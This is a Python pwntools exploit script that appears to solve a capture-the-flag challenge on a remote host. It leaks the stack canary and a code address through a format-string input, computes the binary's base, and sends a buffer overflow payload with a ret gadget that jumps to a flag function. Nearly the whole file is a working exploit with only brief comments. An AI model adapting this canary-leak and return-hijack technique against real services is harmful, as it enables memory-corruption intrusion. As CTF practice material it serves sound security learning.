#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Connect
io = remote('ctf-chall.stembascc.com', 6057)

# Leak canary (pos 19) and main address (pos 25)
io.sendlineafter(b': ', b'%19$p.%25$p')
leak = io.recvline().strip().split(b'.')

canary = int(leak[0], 16)
base = int(leak[1], 16) - 0x137f

log.success(f"Canary: {hex(canary)}")
log.success(f"Base: {hex(base)}")

# Exit loop
io.sendlineafter(b': ', b'exit')
io.recvuntil(b': ')

# Build payload: buffer + canary + rbp + ret + flag
payload = b'A' * 104
payload += p64(canary)
payload += p64(0)
payload += p64(base + 0x1016)  # ret gadget
payload += p64(base + 0x122d)  # flag function

io.sendline(payload)
print(io.recvall(timeout=2).decode())
